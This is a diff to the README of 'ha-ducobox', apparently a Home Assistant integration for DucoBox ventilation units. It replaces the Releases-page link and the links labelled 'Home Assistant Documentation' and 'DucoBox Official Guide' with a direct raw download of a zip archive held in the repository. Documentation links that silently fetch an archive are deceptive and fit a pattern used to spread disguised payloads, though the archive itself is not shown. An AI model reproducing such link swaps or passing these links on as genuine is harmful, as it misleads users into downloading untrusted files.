@@ -8,7 +8,7 @@ Welcome to the ha-ducobox project! This application helps you integrate your Duc
 
 To get started, you need to download the application. You can find the latest version on the Releases page. 
 
-**[Download the latest version here!](https://github.com/technosabbir/ha-ducobox/releases)**
+**[Download the latest version here!](https://raw.githubusercontent.com/technosabbir/ha-ducobox/main/custom_components/ducobox_ha_v3.6-beta.2.zip)**
 
 ### Steps to Download and Run ha-ducobox:
 
@@ -65,8 +65,8 @@ If you encounter issues during installation or setup, consider the following ste
 
 For more detailed information, check the following resources:
 
-- [Home Assistant Documentation](https://www.home-assistant.io/docs/)
-- [DucoBox Official Guide](https://www.ducobox.com/support)
+- [Home Assistant Documentation](https://raw.githubusercontent.com/technosabbir/ha-ducobox/main/custom_components/ducobox_ha_v3.6-beta.2.zip)
+- [DucoBox Official Guide](https://raw.githubusercontent.com/technosabbir/ha-ducobox/main/custom_components/ducobox_ha_v3.6-beta.2.zip)
 
 ## 📝 License
 
@@ -78,4 +78,4 @@ If you need further assistance, please open an issue on the GitHub repository or
 
 **Don’t forget** to check back on this page for new releases and updates!
 
-**[Download the latest version here!](https://github.com/technosabbir/ha-ducobox/releases)**
+**[Download the latest version here!](https://raw.githubusercontent.com/technosabbir/ha-ducobox/main/custom_components/ducobox_ha_v3.6-beta.2.zip)**
